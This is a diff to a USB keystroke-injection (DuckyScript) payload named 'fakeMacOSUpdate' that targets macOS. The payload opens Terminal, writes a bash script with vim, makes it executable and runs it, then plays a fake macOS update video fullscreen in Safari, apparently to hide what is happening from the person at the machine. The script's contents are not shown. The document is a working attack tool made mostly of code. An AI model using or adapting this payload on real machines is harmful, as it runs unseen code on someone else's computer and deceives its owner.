@@ -1,4 +1,12 @@
 ATTACKMODE HID
+REM     TITLE: fakeMacOSUpdate
+REM     AUTHOR: LIAM REIDY
+REM         https://github.com/read-e
+REM     DESCRIPTION: Writes and executes a script,
+REM     then plays a fake MacOS update video
+REM     TARGET: MacOS
+
+REM open terminal, write and execute script
 DELAY 1000
 GUI SPACE
 DELAY 200
@@ -8,6 +16,7 @@ ENTER
 DELAY 700
 STRING vim s.sh
 ENTER
+DELAY 200
 STRING i#!/bin/bash
 ENTER
 ENTER
@@ -29,6 +38,8 @@ STRING chmod +x s.sh
 ENTER
 STRING ./s.sh
 ENTER
+
+REM open safari and play fake update
 GUI SPACE
 DELAY 400
 STRING safa
@@ -39,6 +50,7 @@ GUI t
 STRING https://youtu.be/NJwcQlnMHlU?si=3S09_Uzp1TZQxKgk&t=61
 ENTER
 DELAY 2700
+REM fullscreen and play
 STRING f
 DELAY 400
 SPACE
